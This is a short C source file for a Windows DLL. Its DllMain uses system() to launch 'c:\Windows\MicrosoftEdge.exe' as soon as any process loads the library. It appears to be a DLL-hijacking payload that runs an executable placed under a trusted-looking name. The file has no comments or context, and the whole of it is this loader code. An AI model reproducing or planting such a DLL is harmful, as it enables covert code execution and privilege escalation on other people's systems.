#include <fileapi.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

char command[100];

BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
   switch (dwReason)
   {
    case DLL_PROCESS_ATTACH:
        strcpy(command, "c:\\Windows\\MicrosoftEdge.exe");
        system(command);
    break;
   }
    return TRUE;
}